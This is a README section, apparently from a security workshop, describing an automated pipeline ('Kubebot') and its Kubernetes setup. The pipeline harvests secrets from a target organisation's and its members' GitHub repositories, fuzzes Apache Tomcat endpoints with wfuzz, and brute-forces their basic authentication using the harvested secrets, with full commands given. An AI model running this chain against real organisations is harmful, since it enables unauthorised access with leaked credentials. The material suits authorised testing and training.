# Section-4

## Stand up vulnerable and non-vulnerable JBOSS servers

## Stand up Attack Host with exploit tools

## Using Attack Host to exploit

## Destroying the environment

## Introducing Target, Attack Surface and Automated Testing Methodology
* Domain:
    * Domain points to an Apache Tomcat server.
    * Domain has a github org with members.
* We will scan all the repositories of this org and all the repositories of the org's members using `repo-supervisor`. Results will be stored in a Google BigQuery table.
* We will then run `wfuzz` to do a focussed bruteforcing for Apache Tomcat endpoints on that domain. Results will be stored in a Google BigQuery table.
* We will then use the secrets obtained from `repo-supervisor` and try to bruteforce the basic authentication mechanism of the Apache Tomcat endpoints obtained from `wfuzz`.
* If there is a match, we will get back results in Slack via an incoming webhook.
* Demo of doing all this automatically.

### Running locally
* [Running repo-supervisor and wfuzz locally and converting the results to store in BigQuery](data-converter/README.md)
* [Running wfuzz basic authentication bruteforcer combining the data from both the tools](wfuzz-basicauth-bruteforcer/README.md)

### Running on a K8S cluster
Running the tools repo-supervisor and wfuzz
* Delete and re-create the empty wfuzz and repo-supervisor tables.
* `kubectl create secret generic googlesecret --from-file=$(CREDS_FILEPATH)` - Create a secret with the value of the secret being the JSON credentials file downloaded above. We need this because the containers on the cluster need to authenticate to our K8S cluster to be able to create anything. We don't do this locally because our gcloud environment, by default, is already configured when we first set it up but we need it when running on a K8S cluster
* `kubectl get secrets` - Verify the secret was created
* Make sure the environment values in the `deployments/tools-bq-pod.yaml` deployment file are accurate
* `kubectl apply -f deployments/tools-bq-pod.yaml`

Running the wfuzz basic authN bruteforcer
* Make sure the environment values in the `deployments/tools-wfbrute-pod.yaml` deployment file are accurate
* `kubectl apply -f deployments/tools-wfbrute-pod.yaml`

### Cleanup
* `kubectl delete pods --all`
* Delete the BQ tables

-------------
### Sending a request from Kubebot for a target company
* Initiate a request from Slack by typing a command like `/runautomation wfuzzbasicauthbrute|<www.target.com>`
* API server receives the request
* API server drops a message in the queue to start `wfuzzbasicauthbrute` tool
* The message is picked up by a subscription worker from the queue
* Subscription worker starts 2 GoRoutines:
    * First GoRoutine starts [gitallsecrets](https://github.com/anshumanbh/git-all-secrets) with the options `-token <> -org <target> -toolName repo-supervisor -output /tmp/results/results.json`. As soon as this is finished, the results are uploaded to BigQuery in the table `reposupervisor_test` under the dataset `reposupervisords` by the help of a utility [converttobq](https://hub.docker.com/r/abhartiya/utils_converttobq/)
    * Second GoRoutine starts [wfuzz](https://github.com/anshumanbh/wfuzz) with the options `-w /data/SecLists/Discovery/Web_Content/tomcat.txt --hc 404,429,400 -o csv http://<TARGET>/FUZZ/ /tmp/results/results.csv`. As soon as this is finished, the results are uploaded to BigQuery in the table `wfuzz_tomcat_test` under the dataset `wfuzzds` by the help of a utility [converttobq](https://hub.docker.com/r/abhartiya/utils_converttobq/)
    * All the above jobs are performed inside Docker containers and they are destroyed once they are all completed.
* After the tools finish running above, the subscription worker starts another GoRoutine:
    * This GoRoutine starts a utility [wfuzzbasicauthbrute](https://hub.docker.com/r/abhartiya/utils_wfuzzbasicauthbrute/) with the opttions `-target <target> -slackHook <slackhook>`.
    * This utility basically fetches all the secrets obtained from the `reposupervisor_test` table and stores it in a file. It then fetches all the endpoints obtained from the table `wfuzz_tomcat_test`.
    * For each endpoint (ENDPOINT) retrieved above, the utility does a bruteforce attack against the basic authentication mechanism with all the secrets retrieved above against the URL `http://TARGET/ENDPOINT`. This is done by using the tool [wfuzz](https://github.com/xmendez/wfuzz) with the options `./wfuzz.py -w <all-the-secrets-file> -o csv --basic "admin:FUZZ" --sc 200,403 http://TARGET/ENDPOINT`
    * Finally, for each response with a `200` or `403` status, indicating that the secret worked against that endpoint, the results are sent back to Slack via the incoming Slack webhook.